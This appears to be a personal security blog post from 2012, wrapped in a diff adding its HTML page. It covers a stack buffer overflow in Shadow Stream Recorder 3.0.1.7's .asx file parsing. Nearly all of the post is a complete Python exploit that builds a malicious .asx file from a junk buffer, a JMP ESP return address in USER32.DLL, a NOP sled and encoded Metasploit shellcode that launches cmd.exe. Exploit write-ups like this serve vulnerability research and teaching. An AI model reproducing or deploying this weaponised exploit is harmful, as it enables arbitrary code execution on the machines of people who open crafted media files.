@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8"/>
+    <meta name="author" content="Ankur Tyagi (@7h3rAm)"/>
+    <meta name="description" content="Personal Weblog"/>
+    <meta content="width=device-width, initial-scale=1" name="viewport"/>
+    <title>Mannthan</title>
+    <link href="/static/images/favicon-32x32.png" sizes="32x32" rel="icon" type="image/png"/>
+    <!-- <link rel="stylesheet" href="/static/css/default.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/docco.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/github.min.css"> -->
+    <link rel="stylesheet" href="/static/css/github-gist.min.css">
+    <!-- <link rel="stylesheet" href="/static/css/zenburn.min.css"> -->
+    <script src="/static/js/highlight.min.js"></script>
+    <script src="/static/js/highlightjs-line-numbers.min.js"></script>
+    <script charset="UTF-8" src="/static/js/languages/go.min.js"></script>
+    <link rel="stylesheet" href="/static/css/style.md.css">
+   </head>
+  <body>
+    <div class="header">
+      <table>
+        <tr>
+          <td>
+            <a href="/index.html" style="color:#08f; font-size:14pt;">[🏡 Home]</a>
+            <a href="/archive.html" style="color:#f90; font-size:14pt;">[💾 Archive]</a>
+            <a href="/tags.html" style="color:#671d9d; font-size:14pt;">[🔖 Tags]</a>
+            <a href="/research.html" style="color:#f50; font-size:14pt;">[🔬 Research]</a>
+          </td>
+        </tr>
+      </table>
+    </div>
+    <div class="body">
+          <h1>Shadow Stream Recorder .asx File Parsing Buffer Overflow</h1>
+                  <p><a href="/posts/20120902_word-list-builder-dic-file-parsing-seh.html"> « </a>📅 published on <code>02/Sep/2012</code><a href="/posts/20120902_millenium-mpf-seh.html"> » </a></p>
+                <p>The Shadow Stream Recorder version 3.0.1.7 has a classic stack-based
+buffer overflow vulnerability. Processing specially-crafted Advanced
+Stream Redirector (ASX) media files triggered a memory corruption error.
+This flaw could be exploited to gain arbitrary code execution. The
+exploit for this vulnerability is a vanilla EIP overwrite and has been
+first documented at <a href="http://www.exploit-db.com/exploits/11957/">EDB:
+11957</a></p>
+<p>Here is a complete rewrite of this exploit:</p>
+<pre><code class="python">from struct import *
+
+file = &quot;edb11957.asx&quot;
+
+# msfpayload windows/exec CMD=cmd.exe R | msfencode -b '\x00\x0a\x0d' -t perl
+# [*] x86/shikata_ga_nai succeeded with size 226 (iteration=1)
+
+cmmd = (&quot;\xda\xd5\xb8\x4f\xc1\x95\xae\xd9\x74\x24\xf4\x5a\x29\xc9&quot; +
+&quot;\xb1\x32\x83\xc2\x04\x31\x42\x16\x03\x42\x16\xe2\xba\x3d&quot; +
+&quot;\x7d\x27\x44\xbe\x7e\x58\xcd\x5b\x4f\x4a\xa9\x28\xe2\x5a&quot; +
+&quot;\xba\x7d\x0f\x10\xee\x95\x84\x54\x26\x99\x2d\xd2\x10\x94&quot; +
+&quot;\xae\xd2\x9c\x7a\x6c\x74\x60\x81\xa1\x56\x59\x4a\xb4\x97&quot; +
+&quot;\x9e\xb7\x37\xc5\x77\xb3\xea\xfa\xfc\x81\x36\xfa\xd2\x8d&quot; +
+&quot;\x07\x84\x57\x51\xf3\x3e\x56\x82\xac\x35\x10\x3a\xc6\x12&quot; +
+&quot;\x80\x3b\x0b\x41\xfc\x72\x20\xb2\x77\x85\xe0\x8a\x78\xb7&quot; +
+&quot;\xcc\x41\x47\x77\xc1\x98\x80\xb0\x3a\xef\xfa\xc2\xc7\xe8&quot; +
+&quot;\x39\xb8\x13\x7c\xdf\x1a\xd7\x26\x3b\x9a\x34\xb0\xc8\x90&quot; +
+&quot;\xf1\xb6\x96\xb4\x04\x1a\xad\xc1\x8d\x9d\x61\x40\xd5\xb9&quot; +
+&quot;\xa5\x08\x8d\xa0\xfc\xf4\x60\xdc\x1e\x50\xdc\x78\x55\x73&quot; +
+&quot;\x09\xfa\x34\x1e\xcc\x8e\x43\x67\xce\x90\x4b\xc8\xa7\xa1&quot; +
+&quot;\xc0\x87\xb0\x3d\x03\xec\x4f\x74\x09\x45\xd8\xd1\xd8\xd7&quot; +
+&quot;\x85\xe1\x37\x1b\xb0\x61\xbd\xe4\x47\x79\xb4\xe1\x0c\x3d&quot; +
+&quot;\x25\x98\x1d\xa8\x49\x0f\x1d\xf9\x2a\xc2\x85\x2c\xc9\x64&quot; +
+&quot;\x23\x31&quot;)
+
+junk = &quot;A&quot;*26085
+neip = pack ('&lt;I', 0x7E4456F7) # 7E4456F7  FFE4  JMP ESP USER32.DLL
+nops = &quot;\x90&quot;*56
+
+sploit = junk+neip+nops+cmmd
+
+try:
+    handle = open (file, 'w')
+    handle.write (sploit)
+    handle.close ()
+    print &quot;[+] sploit ready: &quot; + file + &quot; (&quot; + str (len (sploit)) + &quot;B)&quot;
+except:
+    print &quot;[-] exception!&quot;
+</code></pre>
+        <hr/>
+        <p style="text-align:center;">(🔖 tagged <a href=/tags.html#buffer_overflow>buffer_overflow</a> and <a href=/tags.html#exploit>exploit</a>)</p>
+                  <p style="text-align:center;">« <a href="/posts/20120902_word-list-builder-dic-file-parsing-seh.html">Word List Builder .dic File Pa...</a> « | » <a href="/posts/20120902_millenium-mpf-seh.html">Millennium MP3 Studio .mpf Fil...</a> »</p>
+                <hr/>
+    </div>
+    <div class="footer">
+      <p style="text-align:center;">[<a href="https://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">📝 CC BY 4.0</a>]</p>
+    </div>
+    <script>hljs.initHighlightingOnLoad();</script>
+    <script>hljs.initLineNumbersOnLoad();</script>
+  </body>
+</html>
